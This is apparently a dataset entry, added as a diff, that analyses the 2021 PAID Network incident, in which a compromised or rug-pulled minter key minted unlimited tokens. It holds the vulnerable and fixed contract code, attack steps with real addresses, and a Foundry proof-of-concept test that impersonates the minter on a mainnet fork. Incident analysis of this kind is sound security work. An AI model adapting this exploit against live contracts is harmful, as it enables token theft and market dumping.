@@ -1,0 +1,33 @@
+{
+ "id": "2021__2021-03-07_PAID_Network_UnauthorizedMint",
+ "source_file": "2021/2021-03-07_PAID_Network_UnauthorizedMint.md",
+ "title": "PAID Network — Unauthorized mint() Access Vulnerability Analysis",
+ "date": "2021-03-07",
+ "protocol": "PAID Network",
+ "chain": "Ethereum",
+ "loss_raw": "~$180,000,000 (59.4 trillion PAID tokens minted; only a portion was actually sold)",
+ "loss_usd": 180000000.0,
+ "root_cause": "The key with access to the mint() function was compromised (or rug pulled), enabling unlimited token minting",
+ "attack_tx": "Address unconfirmed (direct on-chain call via key compromise / rug pull)",
+ "vulnerable_contract": "0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df (PAID Token)",
+ "classes": [
+  "private-key-compromise"
+ ],
+ "code_before": [
+  "// ❌ A single EOA holds exclusive minting authority\n// PAID Token @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df\ncontract PAIDToken is ERC20, Ownable {\n    // Only onlyOwner or a single minter role is checked\n    function mint(address to, uint256 amount) external onlyMinter {\n        _mint(to, amount);\n        // No upper bound on amount, no total supply cap\n    }\n}",
+  "// ❌ Root cause: The key with access to mint() was compromised (or rug pulled), enabling unlimited token minting\n  function admin() external ifAdmin returns (address) {\n    return _admin();\n  }"
+ ],
+ "code_after": [
+  "// ✅ Multisig + mint cap + time lock\ncontract PAIDToken is ERC20 {\n    address public multisig;      // Gnosis Safe or equivalent multisig wallet\n    uint256 public constant MAX_MINT_PER_TX = 1_000_000 * 1e18;\n    uint256 public lastMintTime;\n    uint256 public constant MINT_COOLDOWN = 24 hours;\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == multisig, \"PAIDToken: only multisig\");\n        require(amount <= MAX_MINT_PER_TX, \"PAIDToken: exceeds mint limit\");\n        require(block.timestamp >= lastMintTime + MINT_COOLDOWN, \"PAIDToken: cooldown\");\n        lastMintTime = block.timestamp;\n        _mint(to, amount);\n    }\n}",
+  "// ✅ Distribute minter role across multisig wallet (e.g. Gnosis Safe)\n// ✅ Apply on-chain TimelockController\n\n// Example using OpenZeppelin TimelockController\ncontract PAIDGovernance {\n    TimelockController public timelock;\n    // mint execution delayed by a minimum of 48 hours\n    // 2-of-3 multisig required\n    constructor(address[] memory proposers, address[] memory executors) {\n        timelock = new TimelockController(\n            48 hours,   // minDelay\n            proposers,  // proposer list\n            executors   // executor list\n        );\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: Attacker obtains minter privilege key",
+  "Step 2: Direct call to PAIDToken.mint()",
+  "Step 3: Newly minted PAID dumped on Uniswap"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────┐\n│ Step 1: Attacker obtains minter privilege key               │\n│ (key compromise or insider rug pull)                        │\n│ Address: 0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE        │\n└─────────────────────┬───────────────────────────────────────┘\n                      │\n┌─────────────────────▼───────────────────────────────────────┐\n│ Step 2: Direct call to PAIDToken.mint()                     │\n│ @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df               │\n│ mint(attacker, 59_471_745_571_548_000_000_000_000_000_000)  │\n└─────────────────────┬───────────────────────────────────────┘\n                      │\n┌─────────────────────▼───────────────────────────────────────┐\n│ Step 3: Newly minted PAID dumped on Uniswap     ",
+  "// testExploit() core logic excerpt — mainnet fork block 11,979,839\nfunction testExploit() public {\n    // Impersonate minter address via vm.prank\n    cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);\n\n    // Direct call to PAID token mint()\n    // @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df\n    IPAIDToken(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df).mint(\n        address(this),\n        59_471_745_571_548_000_000_000_000_000_000  // 59.4 trillion PAID\n    );\n\n    // Verify balance\n    emit log_named_uint(\n        \"PAID Balance after exploit\",\n        IERC20(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df).balanceOf(address(this))\n    );\n}"
+ ]
+}
